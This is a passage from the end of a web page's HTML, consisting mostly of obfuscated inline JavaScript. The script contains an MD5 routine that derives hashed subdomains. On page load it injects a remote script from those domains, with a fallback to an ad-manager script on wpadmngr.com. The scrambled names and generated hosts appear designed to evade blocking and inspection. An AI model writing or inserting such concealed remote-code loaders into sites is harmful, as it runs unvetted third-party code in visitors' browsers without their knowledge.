X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>